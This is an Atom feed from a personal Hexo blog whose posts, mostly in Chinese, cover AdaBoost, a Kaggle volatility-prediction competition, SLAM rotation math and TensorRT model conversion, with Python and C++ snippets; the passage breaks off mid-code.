<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>waynamigo&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://waynamigo.github.io/"/>
  <updated>2021-07-26T02:56:50.651Z</updated>
  <id>http://waynamigo.github.io/</id>
  
  <author>
    <name>waynamigo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>统计学习笔记(后篇)</title>
    <link href="http://waynamigo.github.io/2021/07/01/2021-07-01-statics_note/"/>
    <id>http://waynamigo.github.io/2021/07/01/2021-07-01-statics_note/</id>
    <published>2021-06-30T16:00:00.000Z</published>
    <updated>2021-07-26T02:56:50.651Z</updated>
    
    <content type="html"><![CDATA[<p>接上一篇统计学习笔记，最近在做kaggle，用到了几种Boost，有机会把以前笔记剩余部分的补上了。</p><a id="more"></a><h2 id="Boost"><a href="#Boost" class="headerlink" title="Boost"></a>Boost</h2><p>一句话概括Boost方法就是：将N个弱学习算法构建成一个相当于强学习算法的方法。重点记录AdaBoost和XGBoost两个模型，也是实际应用中广泛使用的方法，效果和时间性能很好。<br>sklearn的ensemble里封装了AdaBoostClassifier，以后写一个kaggle常用的sklearnAPI总结吧。<br>Adaboost解决两个问题</p><ul><li>每一轮如何改变训练数据的权值或者概率分布</li><li>如何将N个弱学习模型组合成一个强学习模型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.通过在n个训练样本上迭代得到第一个弱分类器C1</span><br><span class="line">2.将分错的样本和其他的新数据构建新训练样本n，在这上面迭代得到C2</span><br><span class="line">3.将1.2.都分错的样本和新数据构建新训练样本n，迭代得到C3</span><br><span class="line">4.</span><br></pre></td></tr></table></figure></li></ul><p>设有J个弱分类器，训练样本(X,Y),n维，Adaboost算法流程如下 ，</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接上一篇统计学习笔记，最近在做kaggle，用到了几种Boost，有机会把以前笔记剩余部分的补上了。&lt;/p&gt;
    
    </summary>
    
      <category term="数学" scheme="http://waynamigo.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    
      <category term="Boost" scheme="http://waynamigo.github.io/tags/Boost/"/>
    
      <category term="AdaBoost" scheme="http://waynamigo.github.io/tags/AdaBoost/"/>
    
      <category term="XGBoost" scheme="http://waynamigo.github.io/tags/XGBoost/"/>
    
  </entry>
  
  <entry>
    <title>Optiver Realized Volatility Prediction</title>
    <link href="http://waynamigo.github.io/2021/07/01/2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction/"/>
    <id>http://waynamigo.github.io/2021/07/01/2021-07-01-kaggle-LGB-optiver-realized-volatility-prediction/</id>
    <published>2021-06-30T16:00:00.000Z</published>
    <updated>2021-07-20T01:35:00.862Z</updated>
    
    <content type="html"><![CDATA[<p>以后写kaggle尽量都用一些实用性的算法，该面向简历编程了，论文阅读笔记之类的以后都尽量用英语写</p><a id="more"></a><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Optiver Realized Volatility Prediction Competition.<br>This kaggle project is about trying diff methods to predict the volatility of a trading floor for trading firms,The Accurate Volatility, which is essencial for their investing options.Also is an essencial data standard related to the price of underlying product.<br>IN short, We have to find the most effective approach to minus RMSPE.</p><h3 id="Given-Data"><a href="#Given-Data" class="headerlink" title="Given Data"></a>Given Data</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dataset</span><br><span class="line">├── book_test.parquet</span><br><span class="line">├── book_train.parquet</span><br><span class="line">├── trade_test.parquet</span><br><span class="line">└── trade_train.parquet</span><br></pre></td></tr></table></figure><p>Each folder contains stock_id=n<br><strong>trade</strong> [‘time_id’, ‘seconds_in_bucket’, ‘price’, ‘size’, ‘order_count’]<br><strong>book</strong> [‘time_id’, ‘seconds_in_bucket’, ‘bid_price1’, ‘ask_price1’, ‘bid_price2’, ‘ask_price2’, ‘bid_size1’, ‘ask_size1’, ‘bid_size2’, ‘ask_size2’],<br><strong>train</strong> [‘stock_id’,’time_id’,’target’]<br><strong>test</strong> [‘stock_id’,’time_id’,’row_id’]</p><h3 id="financial-concepts"><a href="#financial-concepts" class="headerlink" title="financial concepts"></a>financial concepts</h3><p>show case:</p><table><thead><tr><th align="center">bid</th><th align="center">price</th><th align="center">ask</th></tr></thead><tbody><tr><td align="center"></td><td align="center">151</td><td align="center">196</td></tr><tr><td align="center"></td><td align="center">150</td><td align="center">189</td></tr><tr><td align="center"></td><td align="center">149</td><td align="center">148</td></tr><tr><td align="center"></td><td align="center">148</td><td align="center">221</td></tr><tr><td align="center">251</td><td align="center">147</td><td align="center"></td></tr><tr><td align="center">351</td><td align="center">146</td><td align="center"></td></tr><tr><td align="center">300</td><td align="center">145</td><td align="center"></td></tr><tr><td align="center">20</td><td align="center">144</td><td align="center"></td></tr><tr><td align="center"><em>1.Content of an order book</em></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- A list of buy or sell records sorted by price, which lists the number of shares being bid on or offered at each price point.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- in the case of given data,’bid’ means <em>How many shares the Buyer want to buy</em> , ‘ask’ means <em>How many shares Sellers offer</em>.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>EACH order book&amp;trade book belongs to 1 kind of stock</strong></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><em>2.Trade procedure</em></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- a TRADE HAPPENS when the shares of stock that seller S offers and buyer B bids  at the same price.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- B can up his/her intended price and buy the offered by S.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><em>3.Liquidity</em></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">there’re some statistics standards for analyser to estimate the liquidity of an order book.</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">- WAP(weighted avaraged price)takes the price level and size of orders</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">$$wap = \frac{bidprice1<em>asksize1+askprice1</em>bidsize1}{asksize1+bidsize1}$$</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Code for WAP caculation, add one column as ‘wap’</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">book_parquet[<span class="string">'wap'</span>] = </span><br><span class="line">(book_parquet[<span class="string">'bid_price1'</span>] * book_parquet[<span class="string">'ask_size1'</span>] + </span><br><span class="line">book_parquet[<span class="string">'ask_price1'</span>] * book_parquet[<span class="string">'bid_size1'</span>])</span><br><span class="line">/(book_parquet[<span class="string">'bid_size1'</span>]+ book_parquet[<span class="string">'ask_size1'</span>])</span><br></pre></td></tr></table></figure></td><td align="center"></td><td align="center"></td></tr></tbody></table><p><em>4.Log returns</em><br>another vital standard for comparing the price of a stock in yesterday and today<br>calling $S_t$ is the price of stock at time $t$ ,the log return is $r_{t1,t2}$,<br>$$r_{t_1, t_2} = \log{\frac{S_{t_2}}{S_{t_1}}}$$<br>Noticed <strong>The host wants competitors should use WAP to compute log returns, and assuming that log returns have 0 mean</strong><br>Then the Code for LogReturn is as follows and add it to book table.<br>Additionally we should expire the NaN row:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LogReturn</span><span class="params">(WAP)</span>:</span></span><br><span class="line"><span class="keyword">return</span> np.log(WAP)</span><br><span class="line">book_parquet[<span class="string">'logreturn'</span>] = LogReturn(book_parquet)</span><br><span class="line"><span class="comment">#expire NaN items</span></span><br><span class="line">book_parquet = book_parquet[~book_example[<span class="string">'log_return'</span>].isnull()]</span><br></pre></td></tr></table></figure><p><em>5.Realized Volatility</em><br>Volatility is described as ‘the annualized standard deviation of one year’s LogReturn’<br>$$\sigma = \sqrt{\sum\limits_t{r^2_{t-1,t}}}$$</p><p>For each stock data, we find that different stock have different volatility characteristics, So one column should be added as ‘stock_id’, using</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stock_id = i</span><br><span class="line">book_parquet.loc[:,<span class="string">'stock_id'</span>] = stock_id</span><br></pre></td></tr></table></figure><h2 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><p>The evaluation metric is Root Mean Square Percentage Error, as:<br>$$\text{RMSPE} = \sqrt{\frac{1}{n} \sum_{i=1}^{n} ((y_i - \hat{y}_i)/y_i)^2}$$<br>The formula above can be implemented as:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RMSPE</span><span class="params">(yhat, data)</span>:</span></span><br><span class="line">y = data.get_label()</span><br><span class="line">elements = ((y - yhat) / y) ** <span class="number">2</span></span><br><span class="line"><span class="keyword">return</span> float(np.sqrt(np.sum(elements) / len(y)))</span><br></pre></td></tr></table></figure><h2 id="Method-s"><a href="#Method-s" class="headerlink" title="Method(s)"></a>Method(s)</h2><p>I looked through the Discussion board, found most are using <em>XGBoost</em> and <em>LightGBT</em>, I get begin from  DataProcessing module and the baseline is implemented with XGBoost, LightGBT will be done later.</p><h3 id="data-processing"><a href="#data-processing" class="headerlink" title="data processing"></a>data processing</h3><p>First check how we should process the parquet file.<br><strong>Parquet</strong>  is a <a href="http://en.wikipedia.org/wiki/Column-oriented_DBMS" target="_blank" rel="noopener">columnar storage</a> format available to any project in the Hadoop ecosystem, regardless of the choice of data processing framework, data model or programming language.<br>Hoster provided code for process the columnar file.<br><strong>and, I’m goin to try to run this method and data on Spark</strong>, The code will be release later on github.<br>Process code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h2><p>you can use <a href="https://lightgbm.readthedocs.io/en/latest/pythonapi/lightgbm.plot_importance.html" target="_blank" rel="noopener">https://lightgbm.readthedocs.io/en/latest/pythonapi/lightgbm.plot_importance.html</a> to see the feature importance of your model.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以后写kaggle尽量都用一些实用性的算法，该面向简历编程了，论文阅读笔记之类的以后都尽量用英语写&lt;/p&gt;
    
    </summary>
    
      <category term="kaggle" scheme="http://waynamigo.github.io/categories/kaggle/"/>
    
    
      <category term="ML" scheme="http://waynamigo.github.io/tags/ML/"/>
    
      <category term="kaggle" scheme="http://waynamigo.github.io/tags/kaggle/"/>
    
      <category term="Boosting" scheme="http://waynamigo.github.io/tags/Boosting/"/>
    
      <category term="xgboost" scheme="http://waynamigo.github.io/tags/xgboost/"/>
    
      <category term="GBDT" scheme="http://waynamigo.github.io/tags/GBDT/"/>
    
  </entry>
  
  <entry>
    <title>3D重建及其深度学习方法的相关论文解析</title>
    <link href="http://waynamigo.github.io/2021/05/13/2021-05-13-3D%E8%A7%86%E8%A7%89_%E4%B8%89%E7%BB%B4%E9%87%8D%E5%BB%BA/"/>
    <id>http://waynamigo.github.io/2021/05/13/2021-05-13-3D视觉_三维重建/</id>
    <published>2021-05-12T16:00:00.000Z</published>
    <updated>2021-07-17T04:55:34.309Z</updated>
    
    <content type="html"><![CDATA[<p>最近实习在读浙大最近的NeuralRecon，里面涉及到一些3D点云处理的数学方法和3DVison的深度学习Tricks，主要包括TSDF算法，特征点提取的SIFT、ORB两种算法，及稀疏卷积等，以及SLAM(simultaneous localization and mapping)基础，从《视觉SLAM十四讲》（高翔等）学习基础。双目算法现在已经比较成熟，目前自己工作只涉及单目相机。</p><a id="more"></a><h2 id="SLAM框架"><a href="#SLAM框架" class="headerlink" title="SLAM框架"></a>SLAM框架</h2><h3 id="视觉里程计（Visual-Odometry）"><a href="#视觉里程计（Visual-Odometry）" class="headerlink" title="视觉里程计（Visual Odometry）"></a>视觉里程计（Visual Odometry）</h3><p>目前项目的硬件设备由单目相机获取信息，进而进行姿态估计、深度估计等计算。<br>简单来说，VO是由相邻两张图片间像素的位置关系估计相机的位置，</p><h4 id="坐标变换-旋转矩阵"><a href="#坐标变换-旋转矩阵" class="headerlink" title="坐标变换 旋转矩阵"></a>坐标变换 旋转矩阵</h4><p>求相机坐标系（o）到世界坐标系（w）下的旋转矩阵$R^o_w$，进行欧式变换可以将o下的向量$p_o$ 转换到w下向量$p_w$<br>求出刚体旋转矩阵$R^o_w$，那么w下向量$p_w$左乘R就可以转化到$p_o$:<br>$p_o = R^o_w  \cdot\ p_w$<br>同理如果两个坐标系下的旋转矩阵可以得到<br>$m = $<br><strong>eg.</strong> 下面是由w到o1 和o2两个旋转矩阵传递得到的o1 -&gt; o2的旋转矩阵<br>设两个相机坐标系下o1,o2对应的三个点a b c，d e f，各获得两个向量 $m1,n1$,$m2,n2$<br>分别构建出该点集合所在的坐标系方程，求解得到世界坐标到o1 , o2的旋转坐标$R_1,R_2$， 则有：世界坐标系向量$m2 = R_1^T \cdot R_2 \cdot m1$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">def RigidBody_Transform(p=np.zeros((3,3),dtype=float), q=np.zeros((3,3),dtype=float)):</span><br><span class="line">    # 世界坐标到 O1的旋转矩阵 ，x = x / ||x|| 单位化</span><br><span class="line">    x = (p[1,:] - p[0,:]) / np.linalg.norm(p[1,:] - p[0,:]) </span><br><span class="line">    y = (p[2,:] - p[1,:]) - np.inner(np.inner((p[2,:] - p[1,:]),x), x)</span><br><span class="line">    y = y / np.linalg.norm(y) # y_bar = y / ||y|| # 单位化第二行</span><br><span class="line">    print(&quot;x&quot;,x)</span><br><span class="line">    print(&quot;y&quot;,y)</span><br><span class="line">    z = np.cross(x, y) #叉乘</span><br><span class="line">    print(&quot;z&quot;,z)</span><br><span class="line">    rotate_matrix_w2o1 = np.array([x, y, z])</span><br><span class="line">    # 世界坐标到  O2的转转矩阵</span><br><span class="line">    x_new = (q[1,:] - q[0,:]) / np.linalg.norm(q[1,:] - q[0,:]) </span><br><span class="line">    y_new = (q[2,:] - q[1,:]) - np.inner(np.inner((q[2,:] - q[1,:]),x_new), x_new)</span><br><span class="line">    y_new = y_new / np.linalg.norm(y_new)</span><br><span class="line">    # 这里要注意，叉积（cross product）和 外积（outer product）不一样</span><br><span class="line">    # ps:国内教材讲的是叉积和外积一样</span><br><span class="line">    # np.cross算叉积 ，np.outer算外积</span><br><span class="line">    z_new = np.cross(x_new, y_new) #这要计算的是叉积（只有三维空间有意义，就是右手系的那个）</span><br><span class="line">    rotate_matrix_w2o2 = np.array([x_new, y_new, z_new])</span><br><span class="line">    return rotate_matrix_w2o1,rotate_matrix_w2o2, (rotate_matrix_w2o1.T * rotate_matrix_w2o2)</span><br><span class="line"></span><br><span class="line">#p = np.array([(-47.34,-18.71,-155.02), (-73.64,-29.82,-210.88), (-64.88,-36.77,-216.15)])</span><br><span class="line">#p = np.array([(-4.34,-36.71,51), (-30,25.5,-4), (-21,18,-10.15)])</span><br><span class="line">#q = np.array([(-40,25.5,6), (-30,25.5,-4), (15.01,55.19,22.818)])</span><br><span class="line">p = np.array([(0,1,0), (0,0,0), (0,0,1)])</span><br><span class="line">q = np.array([(0,-1,0), (0,0,0), (0,0,-1)])</span><br><span class="line">m1,m2,rotate_matrix = RigidBody_Transform(p, q)</span><br><span class="line">print(&quot;rotate_matrix is:\n&quot;)</span><br><span class="line">print(rotate_matrix)</span><br></pre></td></tr></table></figure><h4 id="旋转向量"><a href="#旋转向量" class="headerlink" title="旋转向量"></a>旋转向量</h4><p>上面的旋转矩阵表示具有局限性，原因是求出的矩阵必须是正交阵，优化时比较困难，并且计算量比较大，需要进行矩阵运算，一次运算需要9次浮点乘法，所以又提出一个用<strong>旋转角和旋转轴</strong>表示一个<strong>旋转向量</strong>的描述旋转的方法。同时，旋转向量也可以转换成旋转矩阵:<br>由<strong>罗德里格斯公式(Rodrigus’ Formula)</strong>，n_r 即n^，表示向量n到n对应的反对称矩阵的转换符，计算如下：<br>$a \times b=\begin{Vmatrix} e_1&amp;e_2&amp;e_3\\a_1&amp;a_2&amp;a_3\\b_1&amp;b_2&amp;b_3 \end{Vmatrix}=\begin{bmatrix} a_2b_3-a_3b_2\\a_3b_1-a_1b_3\\a_1b_2-a_2b_1 \end{bmatrix}=\begin{bmatrix}0&amp;-a_3&amp;a_2\\a_3&amp;0&amp;-a_1\\ -a_2&amp;a_1&amp;0\end{bmatrix} \cdot b = a$^$b$<br>上面的$a$^ 表示其对应的反对称矩阵<br>$R = cos \theta I  + (1-cos\theta) n \cdot n^T + sin\theta n$^<br>求转角$\theta$，可以：<br>$tr(R)= \cos\theta tr(I) +(1-\cos\theta)tr(n \cdot n^T) +\sin\theta tr(n$^$)$<br>$\quad\quad =3\cos\theta +(1-\cos\theta) = 1+2\cos\theta$<br>求出$\theta = \arccos \frac{tr(R)-1}{2}$</p><h3 id="回环检测（Loop-Closure-Detection）"><a href="#回环检测（Loop-Closure-Detection）" class="headerlink" title="回环检测（Loop Closure Detection）"></a>回环检测（Loop Closure Detection）</h3><p>判断镜头是否到达过先前位置，和后端（优化）解决因里程计每次计算相邻两张图片的位置关系，每次前后误差叠加出现的<strong>漂移</strong>问题，简而言之就是校正。</p><h3 id="后端优化（非线性）"><a href="#后端优化（非线性）" class="headerlink" title="后端优化（非线性）"></a>后端优化（非线性）</h3><p>接受VO获得的相机位姿、回环检测</p><h3 id="建图"><a href="#建图" class="headerlink" title="建图"></a>建图</h3><p>还没整理好</p><h2 id="3D点云模型"><a href="#3D点云模型" class="headerlink" title="3D点云模型"></a>3D点云模型</h2><h3 id="相机模型"><a href="#相机模型" class="headerlink" title="相机模型"></a>相机模型</h3><p>相机模型得到的相机内参(camera_intrinsic_perview)一般为一张图得到一个<br>通过两种模型<strong>针孔模型（PINHOLE，还有放射模型RADIAL）</strong>，<strong>畸变模型</strong>两种实现内参计算</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近实习在读浙大最近的NeuralRecon，里面涉及到一些3D点云处理的数学方法和3DVison的深度学习Tricks，主要包括TSDF算法，特征点提取的SIFT、ORB两种算法，及稀疏卷积等，以及SLAM(simultaneous localization and mapping)基础，从《视觉SLAM十四讲》（高翔等）学习基础。双目算法现在已经比较成熟，目前自己工作只涉及单目相机。&lt;/p&gt;
    
    </summary>
    
      <category term="3DPointCloud" scheme="http://waynamigo.github.io/categories/3DPointCloud/"/>
    
    
      <category term="DeepLearning" scheme="http://waynamigo.github.io/tags/DeepLearning/"/>
    
      <category term="3DVision" scheme="http://waynamigo.github.io/tags/3DVision/"/>
    
      <category term="3DPointCloud" scheme="http://waynamigo.github.io/tags/3DPointCloud/"/>
    
      <category term="SLAM" scheme="http://waynamigo.github.io/tags/SLAM/"/>
    
  </entry>
  
  <entry>
    <title>NeuralRecon for 3D reconstruction in real-time</title>
    <link href="http://waynamigo.github.io/2021/05/11/2021-05-11-summary_neucon/"/>
    <id>http://waynamigo.github.io/2021/05/11/2021-05-11-summary_neucon/</id>
    <published>2021-05-10T16:00:00.000Z</published>
    <updated>2021-05-13T01:14:57.810Z</updated>
    
    <content type="html"><![CDATA[<p>图像pair 提取特征点算法<br>SIFT<br>SURF<br>ORB</p><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;图像pair 提取特征点算法&lt;br&gt;SIFT&lt;br&gt;SURF&lt;br&gt;ORB&lt;/p&gt;
    
    </summary>
    
      <category term="3D vision" scheme="http://waynamigo.github.io/categories/3D-vision/"/>
    
    
      <category term="3DVision Projection TSDF" scheme="http://waynamigo.github.io/tags/3DVision-Projection-TSDF/"/>
    
  </entry>
  
  <entry>
    <title>DenseDescriptor for SfM Datasset Preparation</title>
    <link href="http://waynamigo.github.io/2021/04/19/2021-04-20-DenseDescriptor/"/>
    <id>http://waynamigo.github.io/2021/04/19/2021-04-20-DenseDescriptor/</id>
    <published>2021-04-18T16:00:00.000Z</published>
    <updated>2021-06-26T10:14:00.462Z</updated>
    
    <content type="html"><![CDATA[<p>一些单目三维重建的概念，及DepthEstimation代码的阅读</p><a id="more"></a><h2 id="4-19日-4月21日"><a href="#4-19日-4月21日" class="headerlink" title="4-19日-4月21日"></a>4-19日-4月21日</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Colmap提取的数据，SFMDataset用来初始化</span><br><span class="line"></span><br><span class="line">ColMap提取SFM数据，作为训练数据集，读取及处理方式</span><br></pre></td></tr></table></figure><h2 id="SLAM和ColMap两个生成数据-输入到DenseDescriptor的兼容性"><a href="#SLAM和ColMap两个生成数据-输入到DenseDescriptor的兼容性" class="headerlink" title="SLAM和ColMap两个生成数据,输入到DenseDescriptor的兼容性"></a>SLAM和ColMap两个生成数据,输入到DenseDescriptor的兼容性</h2><p>class:<br>SFMDataset</p><ul><li>Format</li></ul><hr><p>image_file_names        拆好的图像序列，有序<br>folder_list             data里面的文件夹train/data/1 train/data/2<br>adjandance_range        1 50 邻接范围,控制1-50的随机增量<br>image_downsampling      2.5 图像下采样倍数 resize到 原来的2.5x<br>network_downsampling    64 for downsample and crop mask的参数<br>inlier_percentage       0.99 阈值ground truth<br>load_intermediate_data  True/False 是否加载预计算数据，存在precompute的pickle文件里precompute.pkl<br>intermediate_data_root  precompute文件⬆️的path<br>sampling_size           10<br>heatmap_sigma        5.0 热图参数，用于generate_heatmap_from_locations,生成训练的sourcemap和targetmap<br>pre_workers             4<br>visible_interval         可视化间隔，，用在overlap点云的函数里，和读取colmapresult的函数一起预处理，避免点云密集，可以调整该参数控制稀疏程度。</p><h2 id="num-iter-每个epoch的迭代次数，训练的时候在看"><a href="#num-iter-每个epoch的迭代次数，训练的时候在看" class="headerlink" title="num_iter              每个epoch的迭代次数，训练的时候在看"></a>num_iter              每个epoch的迭代次数，训练的时候在看</h2><ul><li>precompute.pkl 按作者计算的程序来吧，反正按路径来就没问题</li></ul><hr><pre><code>      crop_positions_per_seq    selected_indexed_per_seqvisible_view_indexes_per_seq     point_cloud_per_seq    intrinsic_matrix_per_seq       mask_boundary_per_seq  view_indexes_per_point_per_seq      extrinsics_per_seq      projection_per_seq    clean_point_list_per_seq    image_downsampling   //这三个是    network_downsampling    inlier_percentage    // 符合ground trueth的阈值     estimated_scale_per_seq</code></pre><hr><h3 id="使用tensorrt生成engine进行推理"><a href="#使用tensorrt生成engine进行推理" class="headerlink" title="使用tensorrt生成engine进行推理"></a>使用tensorrt生成engine进行推理</h3><p><a href="https://zhuanlan.zhihu.com/p/351426774" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/351426774</a><br>c++ 写法、思路如下</p><ul><li><p>先将pytorch的Network先转成onnx模型。<br>如果使用DataParallel进行多GPU训练的话，需要注意节点前面的Module.<br>注意版本，某些函数是onnx默认运算符集不支持的函数，比如forbenius norm，只能转成Aten运算符，Aten运算符竟然没找到很好的文档，为了避免风险升级pytorch到 1.6，将运算符集合版本导出为11，支持了现在的大多数函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code here</span><br></pre></td></tr></table></figure></li><li><p>导出onnx在netron看一下，没问题就可以开始用C++转Trt模型，主要包括加载、解析onnx，序列化两个操作进行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> trtEngineName = <span class="string">"out.engine"</span>;</span><br><span class="line">sammple::Logger glogger; </span><br><span class="line">nvinfer1::IBuilder* builder = createInferBuilder(gLogger.getTRTLogger());<span class="comment">//createInferBuilder(ILogger&amp; logger);</span></span><br><span class="line">INetWorkDefinition* network = builder-&gt;createNetWorkV2(maxBatchSize);<span class="comment">//</span></span><br><span class="line">IBuilderConfig*     config  = builder-&gt;createBuilderConfig();</span><br><span class="line"><span class="keyword">auto</span> parser  =nvonnxparser::createParser(*network,gLogger.getTRTLogger());<span class="comment">// a parser for onnx</span></span><br><span class="line"></span><br><span class="line">builder-&gt;setMaxWorkspaceSize(<span class="number">1</span>_GiB);<span class="comment">//NVIDIA document claims "lets TensorRT pick any algorithm available."</span></span><br><span class="line">config-&gt;setMaxWorkspaceSize(<span class="number">1</span>_GiB);</span><br><span class="line"></span><br><span class="line">builder-&gt; setFp16Mode(gArgs.runInFp16);<span class="comment">//two inference mode, FP16 and Int8, Float16 is okay</span></span><br><span class="line"></span><br><span class="line">samplesCommon::enableDLA(builder, config, gArgs.useDLACore);<span class="comment">// DLA is to accelerate some layer // DALI to accelerate data reading</span></span><br><span class="line"></span><br><span class="line">ICudaEngine* engine = builder-&gt;buildCudaEngine(*network);<span class="comment">// build cudaengine of "NvInferRuntime.h"</span></span><br><span class="line"></span><br><span class="line">IHostMemory* trtModel = <span class="literal">nullptr</span>;<span class="comment">// init stream as null point</span></span><br><span class="line">trtModel = engine -&gt;serialize(); <span class="comment">// serialize the onnx model</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="function">ofstream <span class="title">ofs</span><span class="params">(trtEngineName.c_str(), <span class="built_in">std</span>::ios::out | <span class="built_in">std</span>::ios::binary)</span></span>;</span><br><span class="line">ofs.write((<span class="keyword">char</span>*)(trtModel-&gt;data()), trtModel-&gt;size());</span><br><span class="line">ofs.close();</span><br></pre></td></tr></table></figure></li><li><p>上一步导出的模型为out.engine，下一步加载该TRT model（或CudaEngine）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TensorRT</span> &#123;</span></span><br><span class="line">IExecutionContext* context;</span><br><span class="line">ICudaEngine* engine;</span><br><span class="line">IRuntime* runtime;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">TensorRT* <span class="title">LoadNet</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* trtFileName)</span></span>&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="function">ifstream <span class="title">t</span><span class="params">(trtFileName, <span class="built_in">std</span>::ios::in | <span class="built_in">std</span>::ios::binary)</span></span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">stringstream</span> tempStream;</span><br><span class="line">tempStream &lt;&lt; t.rdbuf();</span><br><span class="line">t.close();</span><br><span class="line">DebugP(<span class="string">"TRT File Loaded"</span>);</span><br><span class="line"></span><br><span class="line">tempStream.seekg(<span class="number">0</span>, <span class="built_in">std</span>::ios::end);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> modelSize = tempStream.tellg();</span><br><span class="line">tempStream.seekg(<span class="number">0</span>, <span class="built_in">std</span>::ios::beg);</span><br><span class="line"><span class="keyword">void</span>* modelMem = <span class="built_in">malloc</span>(modelSize);</span><br><span 